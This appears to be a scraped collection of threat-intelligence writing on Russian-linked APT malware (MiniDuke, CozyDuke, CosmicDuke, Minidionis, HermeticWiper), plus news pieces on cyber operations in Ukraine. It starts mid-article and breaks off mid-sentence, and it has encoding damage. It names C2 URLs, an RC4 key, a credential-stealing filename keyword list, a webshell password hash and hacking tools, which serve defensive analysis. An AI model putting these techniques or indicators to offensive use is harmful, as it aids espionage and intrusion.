In another tasking, we notice a tracked victim:  Attackers map a network drive use Microsoft OneDrive to run further tools:  They copy down a base64 encoded document from Microsoft OneDrive to the victim system and decode it there:  Not everything works as planned, so they maintain error reporting facilityÂ forÂ the c2 communications:  Furthermore, ChromeUpdate is a 64-bit executable (which appears to be a WEXTRACT package) that oddly drops a 32-bit Dll. Cache.dll is simply stored as a cabinet file in the ChromeUpdate’s resource section. ChromeUpdate.exe starts the file with “rundll32 cache.dll,ADB_Setup”  Cache.dll was written in C/C++ and built with a Microsoft compiler. Cache.dll code flow overview Structurally, “Cache.dll” is a fairly large backdoor at 425KB. It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn’t exposed until runtime. No pdb/debug strings are present in the code. It maintains eight exports, including DllMain: ADB_Setup is a entry point that simply spawns another thread and waits for completion.  Above, we see a new thread created with the start address of Cache.dll export Â “ADB_Load” by the initial thread. This exported function is passed control while the initial thread runs a Windows message loop. It first grabs an encrypted blob stored away in a global variable and pulls out 381 bytes of this encrypted data:  The standard win32 api CryptDecrypt uses rc4 to decrypt this blob into a hardcoded c2, url path, and url parameters listed below with a simple 140-bit key “x8BxFFx55x8BxECx83xECx50xA1x84x18x03x68x33xC9x66xF7x45x10xE8x1Fx89x45xFCx8Bx45x14x56”.  The code then decodes this set of import symbols and resolves addresses for its networking and data stealing functionality: InternetCloseHandle
InternetReadFile
HttpSendRequestA
HttpOpenRequestA
HttpQueryInfoA
InternetConnectA
InternetCrackUrlA
InternetOpenA
InternetSetOptionW
GetAdaptersInfo Much like the prior office monkey “atiumdag.dll” component, this code collects identifying system information using standard win32 API calls: It then uses the runtime resolved networking API calls to send the collected data back to a hardcoded c2 and set of urls. Cache.dll connectback urls: Observed user-agent string on the wire, but it’s dynamically generated based on the Windows system settings (retrieved using standard win32 api “ObtainUserAgentString”):
“User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)” Communications with the CozyDuke C2 include key/value pairs passed as URL parameters. Observed keys that remind us of the Cosmicduke communicationsÂ include: One of the second stage modules of CozyDuke/Cozy Bear, Show.dll, is particularly interesting because it appears to have been built onto the same platform as OnionDuke. Below we compare Show.dll with the OnionDuke sample MD5: c8eb6040fd02d77660d19057a38ff769. Both have exactly the same export tables and appear to be called internally “UserCache.dll”:  This seems to indicate the authors of OnionDuke and CozyDuke / Cozy Bear are the same, or working together. Another interesting comparison of two other files matches a recent second stage tool from the CozyDuke attacks with a second stage component from other Miniduke/Onionduke attacks. 2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = “UserCache.dll“)
9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = “UserCache.dll“) The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time. The table below presents the function matches based on size data, but the calls, jmps and code all match as well. The contents of only one of these exports in update.dll has no match whatsoever in cache.dll.  Unlike the atiumdag.dll file above, however, cache.dll and update.dll do not maintain anti-AV and anti-analysis functionality sets. Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality. This rotating functionality seems representational for the set, along with other characteristics. Their custom backdoor components appear to slightly evolve over time, with modifications to anti-detection, cryptography, and trojan functionality changing per operation. This rapid development and deployment reminds us of the APT28/Sofacy toolset, especially the coreshell and chopstick components. We expect ongoing and further activity from this group in the near future and variations on the malwareÂ used in previous duke-ish incidents.

 27 Feb 2013 
  minute read								 Authors (or, how many cool words can you fit into one title) On Feb 12th 2013, FireEye announced the discovery of an Adobe Reader 0-day exploit which is used to drop a previously unknown, advanced piece of malware. We called this new malware ?ItaDuke because it reminded us of Duqu and because of the ancient Italian comments in the shellcode copied from Dante Alighieri-s ?Divine Comedy. Since the original announcement, we have observed several new attacks using the same exploit (CVE-2013-0640) which drop other malware. Between these, we’ve observed a couple of incidents which are so unusual in many ways that we-ve decided to analyse them in depth. Together with our partner CrySyS Lab, we-ve performed a detailed analysis of these unusual incidents which suggest a new, previously unknown threat actor. For the CrySyS Lab analysis, please read [here]. For our analysis, please read below. Key findings include: â¢ The MiniDuke attackers are still active at this time and have created malware as recently as February 20, 2013. To compromise the victims, the attackers used extremely effective social engineering techniques which involved sending malicious PDF documents to their targets. The PDFs were highly relevant and well-crafted content that fabricated human rights seminar information (ASEM) and Ukraine-s foreign policy and NATO membership plans.  These malicious PDF files were rigged with exploits attacking Adobe Reader versions 9, 10 and 11, bypassing its sandbox. â¢ Once the system is exploited, a very small downloader is dropped onto the victim-s disc that-s only 20KB in size. This downloader is unique per system and contains a customized backdoor written in Assembler. When loaded at system boot, the downloader uses a set of mathematical calculations to determine the computer-s unique fingerprint, and in turn uses this data to uniquely encrypt its communications later. â¢ If the target system meets the pre-defined requirements, the malware will use Twitter (unbeknownst to the user) and start looking for specific tweets from pre-made accounts. These accounts were created by MiniDuke-s Command and Control (C2) operators and the tweets maintain specific tags labeling encrypted URLs for the backdoors.  These URLs provide access to the C2s, which then provide potential commands and encrypted transfers of additional backdoors onto the system via GIF files. â¢ Based on the analysis, it appears that the MiniDuke-s creators provide a dynamic backup system that also can fly under the radar – if Twitter isn-t working or the accounts are down, the malware can use Google Search to find the encrypted strings to the next C2. This model is flexible and enables the operators to constantly change how their backdoors retrieve further commands or malcode as needed. â¢ Once the infected system locates the C2, it receives encrypted backdoors that are obfuscated within GIF files and disguised as pictures that appear on a victim-s machine.  Once they are downloaded to the machine, they can fetch a larger backdoor which carries out the cyberespionage activities, through functions such as copy file, move file, remove file, make directory, kill process and of course, download and execute new malware and lateral movement tools. â¢ The final stage backdoor connects to two servers, one in Panama and one in Turkey to receive the instructions from the attackers. â¢ The attackers left a small clue in the code, in the form of the number 666 (0x29A hex) before one of the decryption subroutines:  â¢ By analysing the logs from the command servers, we have observed 59 unique victims in 23 countries: Belgium, Brazil, Bulgaria, Czech Republic, Georgia, Germany, Hungary, Ireland, Israel, Japan, Latvia, Lebanon, Lithuania, Montenegro, Portugal, Romania, Russian Federation, Slovenia, Spain, Turkey, Ukraine, United Kingdom and United States.

  minute read								 Authors While inspecting one of the C&C servers of Miniduke, we have found files that were not related to the C&C code, but seemed to be prepared for infecting visitors using web-based vulnerabilities. The page hxxp://[c2_hostname]/groups/business-principles.html is used as an starting point for the attack. It consists of two frames, one for loading the decoy web page from a legitimate website (copied from http://www.albannagroup.com/business-principles.html), and another for performing malicious activities (hxxp://[c2_hostname]/groups/sidebar.html)  Source code of business-principles.html  Decoy webpage loaded The second webpage, “sidebar.html” contains 88 lines, mostly JavaScript code, and works as a primitive exploit pack. Its code identifies the victim’s browser and then serves one of two exploits. It also sends collected browser data to another script by sending a POST request to “hxxp://[c2_hostname]/groups/count/write.php”. The exploits are located in separate web pages. Clients using Internet Explorer version 8 are served with “about.htm”, for other versions of the browser and for any other browser capable of running Java applets, the JavaScript code loads “JavaApplet.html”.  JavaScript code inside sidebar.html page The web page “JavaApplet.html” loads “JavaApplet.class” that implements a Java exploit for the recently discovered vulnerability CVE-2013-0422. The code of the exploit is very similar to the one published in the Metasploit kit, but the inner class that disables the security manager is encoded differently, most likely to avoid detection. According to HTTP headers of the server, the applet was uploaded on February 11, 2013, one month after the Metasploit code was published and two days before Oracle issued a security alert regarding the vulnerability.

 The Java shellcode contains the complete payload, a Win32 DLL file encoded in hex. It decodes the binary and writes it to a Java temporary directory with name “ntuser.bin”. Then, it copies the system file “rundll32.exe” to the same directory with name “ntuser.exe” and runs it with “ntuser.bin” as a parameter, effectively loading the malicious DLL file. That DLL file is the main module of Miniduke, and it uses the URL http://twitter.com/TamicaCGerald to fetch commands.  Tweet with an encoded MiniDuke command
(decoded command URL: hxxp://www.artas.org/web/) The web page “about.htm” implements an exploit for Microsoft Internet Explorer 8. It uses a vulnerability discovered at the end December 2012, CVE-2012-4792. The code is also very similar to the Metasploit version of the exploit, while the payload part of the shellcode has been written by the Miniduke authors re-using the backdoor’s code. The Metasploit code was released on December 29, 2012 and the vulnerability was officialy fixed on January 14, 2013 (MS13-008) while the page with the exploit was uploaded on February 11, 2013.

The purpose of the shellcode is to download a GIF image file from URL hxxp://[c2_hostname]/groups/pic.gif, then search for and decrypt the hidden PE file inside of it. The PE file also appeared to be a modification of the Miniduke's main backdoor module that uses the same Twitter URL as the Java payload.
Conclusions
We have discovered and analysed two previously unknown infector vectors that were used in the MiniDuke attacks. Although the exploits were already known and published at the time of the attack, they were still very recent and could have worked against designated targets. As previously recommended, updating Windows, Java and Adobe Reader to the latest versions should provide a basic level of defense against the known Miniduke attacks. Of course, it is possible that other unknown infection vectors exist; we will continue to monitor the situation and update the blog with new data when appropriate.

 03 Jul 2014 
  minute read								 Authors In 2013, together with our partner CrySyS  Lab, we announced our research on a new APT actor we  dubbed “Miniduke”. It stood out from the “APT bunch” for several reasons,  including: We have pointed out that this threat actor  used malware developed using “old-school” virus writing techniques and habits. Our analysis was continued later by researchers from  CIRCL/Luxembourg and several other AV companies. Recently, we became aware of an  F-Secure publication on the same topic (under the name  “CosmicDuke”). In the wake of our publications from 2013, the Miniduke campaigns  have stopped or at least decreased in intensity. However, in the beginning of  2014 they resumed attacks in full force, once again grabbing our attention.  We believe it’s time  to uncover more information on their operations. The old style Miniduke implants from 2013  are still around and being used during the current campaigns. It still relies on  Twitter accounts which contain a hardcoded C&C URL pointing to the command  and control server. One such account was the following, observed in February  2014:  Although the format of the C&C URL was changed from previous variants, the encoding algorithm is the same. The line above can be decoded into the full C&C URL: hxxp://algherolido.it/img/common/thumb/thumb.php This decoded URL was an active C&C, from which several updates have been collected: Update 1: This Trojan is  a large package, due to the use of a custom packer. The bundle has a specific  debug string inside: C:Projectsnemesis-geminanemesisbincarriersezlzma_x86_exe.pdb The package executes  a smaller Trojan module: Another update  that has been observed on the C&C server was: Update 2: We have observed another similar Trojan, although not on the C&Cs directly: The use of the Nemesis Gemina packer in the Miniduke payloads made us look for further samples in our collection. This led us to several new findings. After the 2013 exposure, the actor behind  Miniduke appears to have switched to using another custom backdoor, capable of  stealing various types of information. The malware spoofs  popular applications designed to run in the background, including file  information, icons and even file size:  The main “new” Miniduke backdoor (aka  TinyBaron or CosmicDuke) is compiled using a customizable framework called  “BotGenStudio”, which has flexibility to enable/disable components  when the bot is constructed. The components can be divided into 3 groups Miniduke/CosmicDuke is capable of starting via Windows Task Scheduler, via a customized service binary that spawns a new process set in the special registry key, or is launched when the user is away and the screensaver is activated. The malware can steal a variety of information, including files based on extensions and file name keywords: *.exe;*.ndb;*.mp3;*.avi;*.rar;*.docx;*.url;*.xlsx;*.pptx;*.ppsx;*.pst;*.ost;*psw*;*pass*;*login*;*admin*;*sifr*;*sifer*;*vpn;*.jpg;*.txt;*.lnk; *.dll;*.tmp;*.obj;*.ocx;*.js Note: we believe the “*sifr*” and “*sifer*”  keywords above refer to the transliteration of the English word “Cypher” in  some languages. Also, the backdoor  has many other capabilities including: The malware implements several methods to  exfiltrate information, including uploading data via FTP and three variants of  HTTP-based communication mechanisms. A number of different HTTP connectors act  as helpers, trying various methods in case one of them is restricted by local  security policies or security software. These three methods are: Each victim is assigned a unique ID, making  it possible to push specific updates to an individual victim. As we noted,  Miniduke/CosmicDuke is protected with a custom obfuscated loader which heavily  consumes CPU resources for 3-5 minutes before passing execution to the payload.  This not only complicates analysis of the malware but is also used to drain  resources reserved for execution in emulators integrated in security software.  Besides its own obfuscator, it makes heavy use of encryption and compression  based on the RC4 and LZRW algorithms respectively.  Implementations of these algorithms have tiny differences from the standardized  code which perhaps looks like a mistake in the code. Nevertheless, we believe  that these changes were introduced on purpose to mislead researchers. One of the more technically advanced parts  of Miniduke is the data storage. The internal configuration of the malware is  encrypted, compressed and serialized as a complicated registry-like structure  which has various record types including strings, integers and internal  references. In addition, Miniduke  uses an unusual method to store the exfiltrated data. When a file is uploaded  to the C&C server it is split into small chunks (~3KB), which are  compressed, encrypted and placed in a container to be uploaded to the server.  If the source file is large enough it may be placed into several hundred different  containers that are uploaded independently. These data chunks are probably parsed,  decrypted, unpacked, extracted and reassembled on the attacker’ side. This  method is used to upload screenshots made on the victim’s machine. Creating  such a complicated storage might be an overhead; however, all those layers of  additional processing guarantees that very few researchers will get to the  original data while offering an increased reliability against network errors. Based on our analysis, the victims of  Miniduke and CosmicDuke fall into these categories: From one of the  old style Miniduke servers we were able to extract a list of victims and their  corresponding countries. We were able to identify victims in three of these countries which belonged to the “government”  category. Here’s the list of countries affected: One of the CosmicDuke  servers we analyzed had a long list of victims dating back to April 2012. This  server had 265 unique identifiers assigned to victims from 139 unique IPs.  Geographical distribution of the victims was as follows (top10): 

 According to our analysis, the attackers were more interested in  expanding their operations and scanned IP ranges and servers in Azerbaijan, Greece and Ukraine. During the analysis, we were able to obtain  a copy of one of the CosmicDuke command and control servers. It appears it was  also used for other operations by the group members, including hacking into  other servers on the internet. The attackers have deployed a number of  publicly available hacking tools on this server in order to scan and compromise  websites of victim organizations as well as collect information for future  targeted attacks. Here is the  list of hacking tools found on the server: Hydra: “A very fast  network logon cracker which support many different services” Fierce2: “A semi-lightweight  enumeration scanner that helps penetration testers locate non-contiguous IP  space and hostnames for a specified domains using things like DNS, Whois and  ARIN” The Harvester: “The objective of this program is  to gather emails, subdomains, hosts, employee names, open ports and banners  from different public sources like search engines, PGP key servers and SHODAN  computer database” RitX: “A Reverse IP  Lookup Tool that will allows you to use an IP address or domain name to  identify all currently domains hosted on a server using multiple services and  various techniques” Joomscan: “OWASP  Joomla! Vulnerability Scanner” Ncrack: “High-speed  network authentication cracking tool. It allows for rapid, yet reliable  large-scale auditing of multiple hosts” Sqlmap: “An open  source penetration testing tool that automates the process of detecting and  exploiting SQL injection flaws and taking over of database servers” WPScan: “A black box  WordPress vulnerability scanner” Note: tool descriptions were copied from their  public websites Although the  attackers use English in several places, indicating knowledge of this language,  there are certain indicators to suggest they are not native English speakers. The following strings  were discovered in a block of memory appended to the malware component used for  persistence: www.mirea.ru

The Miniduke attackers’ webshell on hacked hosts For the  webshell, it is interesting to point to the use of Codepage 1251, which is  commonly used to render Cyrillic characters. The password used to protect the  shell, is checked against the MD5 hash “35c7c2d1fe03f0eeaa4630332c242a36“.  (BTW: can you crack it? It took us some days to solve it!) Perhaps it is  noteworthy to say that the same webshell has been observed in the operations of  another advanced threat actor known as Turla, Snake or Uroburos. Another  interesting aspect is the debug path strings from the malware, which indicate  several build environments or groups of “users” of the “Bot Gen Studio”,  “NITRO” and “Nemesis Gemina”: c:botgenstudiogenerationsfdd88801binBot.pdb

It appears the  attackers follow the Mon-Fri work week, however, they do work on the weekends  from time to time.
In terms of activity  hours, the attackers appear to be working between 6am and 7pm GMT. Most of the  work is done between 6am and 4pm though.




Conclusions
Although they  stopped or at least decreased in intensity following our announcement last  year, the Miniduke attacks are now back in force. The old style Miniduke  malware is still being used, deploying previously known stages packed with a  new obfuscator observed with the mysterious “Bot Gen Studio” for the “NITRO”  and “Nemesis Gemina” projects.
While the old  style Miniduke implants were used to target mostly government victims, the new  style CosmicDuke implants have a somehow different typology of victims. The  most unusual is the targeting of individuals that appear to be involved in the  traffic and reselling of controlled and illegal substances, such as steroids  and hormones. These victims in the NITRO project have been observed only in  Russia. One possibility is that “Bot Gen Studio” is a malware platform also  available as a so-called “legal spyware” tool, similar to others, such as  HackingTeam’s RCS, widely used by law enforcement agencies. Another possibility  is that it’s simply available in the underground and purchased by various  competitors in the pharmaceutical business to spy on each other.
At the same  time, the “Nemesis Gemina” project focuses on government, diplomatic, energy, military  and telecom operators.
One of the big questions here is: Are the  Miniduke attackers still “elite”? Though the old malware is still in use, the  new malware is no longer pure assembler; instead, it’s written in C/C++.
The new samples of  Miniduke/CosmicDuke use a powerful obfuscator. For almost all of the samples we  analyzed, it jumps to the beginning of dynamic PE loader – always from the same  “l33t” address (if memory layout allowed it during the bot  construction):




Hence, you could say that CosmicDuke is still “l33t”!

  minute read								 Authors Yesterday our colleagues from Palo Alto Networks presentedÂ their Minidionis research (also known by the Kaspersky name â “CloudLook”). It’s another backdoor from the APT group responsible for other attacks, such as CozyDuke , MiniDuke, and CosmicDuke. Analyzing this malware, we noticed that attackers implemented a cloud drive capabilityÂ to store malware and download them onto infected systems. Almost aÂ year ago, we observed another APT group named “CloudAtlas” using cloud drives to store stolen information. Now we see a similar technique in CloudLook/Minidionis. Minidionis uses a multidropper scheme to infect its victims. First, to get in, this attacker uses spear-phishing emails with a self-extracting archive attachment pretending to be a voicemail. When the victim opens an archive, the second stage dropper executes and a .wav file plays looking like a real voicemail. In its spearphish, CloudLook also used a self-extracting archive containing a PDF file luring it’s victims with information regarding world terrorism:  After successful execution, the Minidionis second stage dropper uses Onedrive cloud storage to download a payload:  The malware maps a Onecloud storage drive as a network drive using a hardcoded login and password, and then copies down itsÂ cloud-stored backdoorsÂ to the local system:  Could this approach become more mainstream? It’s quite possible, because it effectively gives the attackers a simple method of hiding malicious behavior. Detecting malicious traffic with legitimateÂ cloud services is more complicated, becauseÂ it means blocking legitimate services. According to Kaspersky Security Network, eachÂ attack using a Minidionis/CloudLook backdoor was specifically crafted for a particular target. This specificity demonstratesÂ that the attacks are highly customized and focused on valuable targets. So far, we’ve observed several targets, most notably EuropeanÂ diplomatic organizations. Kaspersky Lab detects all known samples of Minidionis/CloudLook as Trojan.Win32.Generic, and successfully protects its users against the threat.

SentinelOne Labs,https://www.washingtonpost.com/politics/2022/03/07/putins-invasion-ukraine-didnt-rely-cyber-warfare-heres-why/,"This article was published more thanÂ 1 year ago The ongoing conflict in Ukraine has perplexed observers expecting to see the cyber dimension unfold differently. When Russia began to mass troops along Ukraineâs borders, analysts predicted that cyber operations would be critical to Putinâs military strategy. One headline offered that the Russian invasion could âredefine cyberwarfare.â Former White House cyber expert Jason Healey hypothesized that âit will be the first time a state with real capabilities is willing to take risks and put it all on the line.â Despite these predictions, the expected âshock and aweâ Russian cyber campaign in preparation of the invasion of Ukraine never emerged. Moreover, while the conflict will undoubtedly evolve, cyber operations donât appear to be playing a decisive role on the battlefield. Surprised? Weâre not. Academic research explains why cyber operations are poor tools of coercion â whether used independently or as part of conventional warfighting. What clues do earlier Russian cyber operations give? Scholarly research details Russiaâs long history of cyber operations against Ukraine. Russiaâs 2014 annexation of Crimea included cyber operations in parallel to kinetic ones. Distributed denial of service attacks, for instance, strategically flooded Ukrainian networks to crash operations. In 2015, Russia carried out a cyberattack against Ukraineâs power grid. And in 2017, Russia unleashed the data-wiping NotPetya virus, malware that targeted Ukrainian servers initially but quickly spread around the world. Russiaâs land grabs in Ukraine could break the international order Yet experts who inferred from Russiaâs past behavior that the current conflict would be a âCyber Pearl Harborâ moment may have been drawing the wrong lesson. There is little evidence that cyber operations provided Russia with an operational advantage in 2014 â let alone highly synchronized combined arms warfare. And the power grid attack â in the dead of winter â did not cause any deaths, and service was restored within hours. Russiaâs current cyber efforts have had little impact Many of the recent cyberattacks aimed to fragment the trust Ukrainians have in their government â and these information operations clearly havenât been effective. In mid-January, Microsoft and other monitors reported that destructive malware, âWhisperGate,â was targeting Ukrainian organizations. In a different operation, Russian-linked hackers reportedly defaced 70 Ukrainian government websites. In mid-February, the U.S. and U.K. governments attributed disruptive attacks to Russia, with follow-on attacks Feb. 23. The same day, âHermeticWiperâ malware was discovered operating in a number of Ukrainian commercial and government systems. Hacktivists are engaging Hacktivists, proxy groups and freelancers jumped in quickly â on both sides. Ukraine, lacking mature offensive cyber capabilities, appealed to the public to help marshal an âIT Army.â The Ukrainian government used Twitter to share a list of Russian targets and, later, Belarusian targets. But Russian ransomware operators also offered their services, threatening to retaliate against governments that sought to punish Russia. These appear to be loosely controlled proxy groups, not a unified effort. A Ukrainian member of the Russian-linked Conti ransomware group, for instance, reportedly leaked the groupâs internal chat logs to counter the pro-Russian effort. Why isnât cyberwarfare decisive? Cyber operations in combat contexts may not be as prolific or decisive as many expect, as demonstrated by evidence not only from Ukraine, but also from Afghanistan, Iraq and Syria. The U.S. military, for instance, discovered that dropping âcyber bombsâ on the Islamic State netted ambiguous results. The Ukraine crisis is now a nuclear crisis Cyber operations are a form of modern political warfare, rather than decisive battles. These operations donât win wars, but instead support espionage, deception, subversion and propaganda efforts. Hereâs why the current cyber operations are neither as easy nor as effective as the conventional wisdom would suggest. First, the global tech sector plays a major role in cyberdefense, with firms such as Microsoft, Alphabet and others working overtime to identify threats to Ukraine, patch vulnerabilities and share information. Additionally, in anticipation of Russian cyber action, the United States and Britain dispatched cyber defensive teams to Ukraine in December. Reporting suggests that U.S. cyber mission teams continue to support Ukraineâs cyberdefense from Eastern Europe. Second, preemptive actions may have boosted Ukraineâs resilience. Ukrainians were downloading encrypted communications applications such as Signal and offline maps â but the Ukrainian military also relied on old-school wired communications. Third, low-cost cyber operations readily available to hacktivists and proxy groups â like the denial-of-service attacks or website defacements â disrupt and distract more than they create tangible battlefield gains. In contrast, offensive cyber operations tailored to shut down another countryâs command-and-control or air-defense systems, for instance, can be challenging. It takes years of investment and human capital, pre-positioned access points and a mature, well-resourced organization to plan and carry out this type of complex cyber campaign. And even the most sophisticated offensive cyber operations canât compete with conventional munitions. Itâs far easier to target the enemy with artillery, mortars and bombers than with exquisite and ephemeral cyber power. Notwithstanding any cyber vulnerabilities, itâs much simpler for Russia to launch an artillery barrage at a power substation than to hack it from Moscow. Russiaâs airstrikes against a Ukrainian television tower may be a case in point. Check out all TMCâs coverage of the Russia and Ukraine crisis in our new topic guide: Russia and its neighbors Could the cyber game change? The cyber dimension of this conflict may yet change, of course. But the fact that cyber operations are not always easy, cheap or effective in managing destruction at scale means theyâre unlikely to produce the game-changing moment in modern warfare that many anticipated. Cyberweapons may be used beyond the battlefield, however. There is still a risk that Russia may conduct retaliatory cyberattacks against the United States and its allies. Russia probably has already pre-positioned accesses that it could exploit to conduct disruptive attacks. There is a long history of countries â Russia included â responding in cyberspace to actions like sanctions and indictments. Most importantly, cyber experts may be missing the forest for the trees, given the large-scale interstate war unfolding at the moment. The success or failure of theories of cyberwarfare have minimal relevance when considering the humanitarian catastrophe and enormous toll that combat inflicts â not to mention the risks of nuclear warfare.

SentinelOne Labs,https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/,"This post was updated Feb 28th 2022 to include new IOCs and the PartyTicket âdecoy ransomwareâ. On February 23rd, our friends at Symantec and ESET research tweeted hashes associated with a wiper attack in Ukraine, including one which is not publicly available as of this writing.  We started analyzing this new wiper malware, calling it âHermeticWiperâ in reference to the digital certificate used to sign the sample. The digital certificate is issued under the company name âHermetica Digital Ltdâ and valid as of April 2021. At this time, we havenât seen any legitimate files signed with this certificate. Itâs possible that the attackers used a shell company or appropriated a defunct company to issue this digital certificate. This is an early effort to analyze the first available sample of HermeticWiper. We recognize that the situation on the ground in Ukraine is evolving rapidly and hope that we can contribute our small part to the collective analysis effort. At first glance, HermeticWiper appears to be a custom-written application with very few standard functions. The malware sample is 114KBs in size and roughly 70% of that is composed of resources. The developers are using a tried and tested technique of wiper malware, abusing a benign partition management driver, in order to carry out the more damaging components of their attacks. Both the Lazarus Group (Destover) and APT33 (Shamoon) took advantage of Eldos Rawdisk in order to get direct userland access to the filesystem without calling Windows APIs. HermeticWiper uses a similar technique by abusing a different driver, empntdrv.sys. The copies of the driver are ms-compressed resources. The malware deploys one of these depending on the OS version, bitness, and SysWow64 redirection. The benign EaseUS driver is abused to do a fair share of the heavy-lifting when it comes to accessing Physical Drives directly as well as getting partition information. This adds to the difficulty of analyzing HermeticWiper, as a lot of functionality is deferred to DeviceIoControl calls with specific IOCTLs. HermeticWiper enumerates a range of Physical Drives multiple times, from 0-100. For each Physical Drive, the \\.\EPMNTDRV\ device is called for a device number.  The malware then focuses on corrupting the first 512 bytes, the Master Boot Record (MBR) for every Physical Drive. While that should be enough for the device not to boot again, HermeticWiper proceeds to enumerate the partitions for all possible drives. They then differentiate between FAT and NTFS partitions. In the case of a FAT partition, the malware calls the same âbit fiddlerâ to corrupt the partition. For NTFS, the HermeticWiper parses the Master File Table before calling this same bit fiddling function again. We euphemistically refer to the bit fiddling function in the interest of brevity. Looking through it, we see calls to Windows APIs to acquire a cryptographic context provider and generate random bytes. Itâs likely this is being used for an inlined crypto implementation and byte overwriting, but the mechanism isnât entirely clear at this time. Further functionality refers to interesting MFT fields ($bitmap, $logfile) and NTFS streams ($DATA, $I30, $INDEX_ALLOCATION). The malware also enumerates common folders (âMy Documentsâ, âDesktopâ, âAppDataâ), makes references to the registry (ântuserâ), and Windows Event Logs (""\\\\?\\C:\\Windows\\System32\\winevt\\Logs""). Our analysis is ongoing to determine how this functionality is being used, but it is clear that having already corrupted the MBR and partitions for all drives, the victim system should be inoperable by this point of the execution. Along the way, HermeticWiperâs more mundane operations provide us with further IOCs to monitor for. These include the momentary creation of the abused driver as well as a system service. It also modifies several registry keys, including setting the SYSTEM\CurrentControlSet\Control\CrashControl CrashDumpEnabled key to 0, effectively disabling crash dumps before the abused driverâs execution starts. Finally, the malware waits on sleeping threads before initiating a system shutdown, finalizing the malwareâs devastating effect. On February 24th, 2022, Symantec researchers pointed to a new Go ransomware being used as a decoy alongside the deployment of HermeticWiper. During our analysis we decided to name it PartyTicket based on some of the strings used by the malware developers:  The idea of using a ransomware as a decoy for a wiper is counterintuitive. In particular, a ransomware as poorly coded as PartyTicket is more likely to tie up resources during the execution of an otherwise efficient wiper. As often happens to amateur Go developers, the malware has poor control over its concurrent threads and the commands it attempts to run. This leads to hundreds of threads and events spawned in our consoles. That is to say, itâs a very loud and ineffective ransomware that should fire alerts left and right. The folder organization and function naming conventions within the binary show the developerâs intent for taunting the U.S. Government and the Biden administration. Similar taunting can be found in the ransom note after execution:  In trying to understand the execution flow of PartyTicket, we see the 403forBiden.wHiteHousE.primaryElectionProcess() function recursively enumerating folders: The resulting number of folders will be used as an upperbound for concurrent threads, a mistake by the Go devs as that effectively ties up all of the systemâs resources. While the files found are all queued into a channel for the threads to reference. The function indirectly called for each thread is main.subscribeNewPartyMember(). It in turn takes a filename, makes a copy with a <UUID>.exe name and deletes the original file. Then we expect a second loop to relieve that queue of files and run each through a standard Go AES crypto implementation. However, execution is unlikely to get this far with the current design of PartyTicket. (Thanks to Joakim Kennedy (Intezer) for pointing out this indirect call) Overall our analysis of PartyTicket indicates it to be a rather simple, poorly coded, and loud malware. Its possible role as a decoy ransomware deployed alongside HermeticWiper is more likely to be effective for its accidental hogging of the victim organizationâs system resources rather than the encryption of files itself. IOCs and Yara rules have been added below. After a week of defacements and increasing DDoS attacks, the proliferation of sabotage operations through wiper malware is an expected and regrettable escalation. At this time, we have a very small sliver of aperture into the attacks in Ukraine and subsequent spillover into neighboring countries and allies. If thereâs a silver lining to such a difficult situation, itâs seeing the open collaboration between threat intel research teams, independent researchers, and journalists looking to get the story straight. Our thanks to the researchers at Symantec, ESET, Stairwell, and RedCanary among others whoâve contributed samples, time, and expertise.

SentinelOne Labs,https://www.reuters.com/business/energy/satellite-outage-knocks-out-control-enercon-wind-turbines-2022-02-28/,"A views shows an E-66 wind turbine manufactured by German company Enercon in Nibas, Picardie region, July 16, 2014. REUTERS/Benoit Tessier BERLIN/FRANKFURT, Feb 28 (Reuters) - Germany's Enercon on Monday said a ""massive disruption"" of satellite connections in Europe was affecting the operations of 5,800 wind turbines in central Europe. It said the satellite connections stopped working on Thursday, knocking out remote monitoring and control of the wind turbines, which have a total capacity of 11 gigawatt (GW). ""The exact cause of the disruption is not yet known. The communication services failed almost simultaneously with the start of the Russian invasion of Ukraine,"" Enercon said in a statement. The company said it had no further information on who or what may have caused the disruption. Enercon has informed Germany's cybersecurity watchdog BSI and is working with the relevant providers of the satellite communication networks to resolve the disruption, which it said affected around 30,000 satellite terminals used by companies and organisations from various sectors across Europe. BSI said it was aware that a satellite-based communications operator has experienced a malfunction and that this had restricted the maintenance of some wind turbines, without providing details. ""However, no effects on power grid stability are currently expected due to redundant communication capabilities of the responsible grid operators. Further investigations into the cause are being carried out by the company concerned in close exchange with the responsible authorities,"" BSI said. U.S.-listed satellite communications firm Viasat Inc (VSAT.O) said earlier on Monday it was investigating a suspected cyberattack that caused a partial outage in its residential broadband services in Ukraine and other European countries.  read more  Enercon is working with the operators of the affected wind farms to set up alternative ways to regain remote control of the turbines, it said, without naming the operators. There was no risk to the turbines as they continued to operate on ""auto mode,"" the company said. German daily Handelsblatt first reported the disruption earlier on Monday.

SentinelOne Labs,https://www.reversemode.com/2022/03/satcom-terminals-under-attack-in-europe.html,"
  ------ Update 03/12/2022 Reuters has published new information on this incident, which initially matches the proposed scenario. You can find the update  at the bottom of this post. ------  February 24th: at the same time Russia initiated a full-scale attack on Ukraine, tens of thousands of KA-SAT SATCOM terminals suddenly stopped working in several european countries: Germany, Ukraine, Greece, Hungary, Poland...Germany's Enercon moved forward and acknowledged that approximately 5800 of its wind turbines, presumably those remotely operated via a SATCOM link in central Europe, had lost contact with their SCADA server.  In the affected countries, a significant part of the customers of Eutelsat's domestic broadband service were also unable to access Internet.  From the very beginning Eutelsat and its parent company Viasat, stated that the issue was being investigated as a cyberattack. Since then, details have been scarcely provided but few days ago I came across a really interesting video in the following tweet. In the video, the Commander General Michel Friedling confirms that the incident was originated by a cyberattack. However, he also provides a key detail that has the potential to turn a boring DDoS scenario, as some initially pointed out, into something much more interesting: ""the terminals have been damaged, made inoperable and probably cannot be repaired""  Based on the information publicly available and my experience researching into SATCOM terminals I'll try to present a plausible explanation for such a destructive attack.  Please note that this is merely a speculative exercise, although backed by a realistic technical reasoning...anyway probably I'm totally wrong. Back in 2014 and then in 2018 I presented at BlackHat USA two different papers mainly focused on evaluating the security posture of multiple SATCOM terminals, by uncovering a plethora of vulnerabilities and real-world scenarios across different sectors. Within these papers the reader can find an introduction to the SATCOM architecture, 